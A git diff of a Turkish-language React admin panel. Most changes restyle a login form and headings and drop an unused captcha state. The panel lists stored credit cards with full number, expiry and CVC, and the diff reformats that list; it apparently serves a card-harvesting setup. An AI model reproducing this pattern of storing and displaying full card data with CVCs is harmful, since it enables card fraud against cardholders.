@@ -5,7 +5,6 @@ function Login({ onLogin }) {
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
   const [error, setError] = useState(null)
-  const [captchaValue, setCaptchaValue] = useState(null)
 
   const handleSubmit = (e) => {
     e.preventDefault()
@@ -23,25 +22,25 @@ function Login({ onLogin }) {
 
   return (
     <div className="bg-white p-8 rounded-lg shadow-lg max-w-md mx-auto">
-      <h1 className="text-3xl font-bold mb-8 text-center">Giriş</h1>
+      <h1 className="text-4xl font-bold mb-10 text-center">Giriş</h1>
       <form onSubmit={handleSubmit} className="space-y-6">
         <input
           type="text"
           placeholder="Kullanıcı Adı"
           value={username}
           onChange={(e) => setUsername(e.target.value)}
-          className="w-full p-3 border border-gray-300 rounded-lg"
+          className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
         />
         <input
           type="password"
           placeholder="Şifre"
           value={password}
           onChange={(e) => setPassword(e.target.value)}
-          className="w-full p-3 border border-gray-300 rounded-lg"
+          className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
         />
         <button
           type="submit"
-          className="w-full p-3 bg-red-600 text-white font-semibold rounded-lg hover:bg-red-700"
+          className="w-full p-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 focus:outline-none"
         >
           Giriş Yap
         </button>
@@ -94,7 +93,7 @@ export default function AdminPanel() {
           <Login onLogin={handleLogin} />
         ) : (
           <>
-            <h1 className="text-3xl font-bold mb-12 text-center">
+            <h1 className="text-4xl font-bold mb-12 text-center">
               Admin Paneli
             </h1>
             <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
@@ -114,12 +113,14 @@ export default function AdminPanel() {
               <div className="bg-white p-8 rounded-lg shadow-lg">
                 <h2 className="text-2xl font-semibold mb-6">Kredi Kartları</h2>
                 {creditCards.map((card, index) => (
-                  <p
+                  <div
                     key={index}
-                    className="border-b border-gray-200 py-2 text-lg"
+                    className="border-b border-gray-200 py-2 text-lg flex justify-between"
                   >
-                    {card.cardNumber} - {card.expiry} - {card.cvc}
-                  </p>
+                    <p>{card.cardNumber}</p>
+                    <p>{card.expiry}</p>
+                    <p>{card.cvc}</p>
+                  </div>
                 ))}
               </div>
             </div>
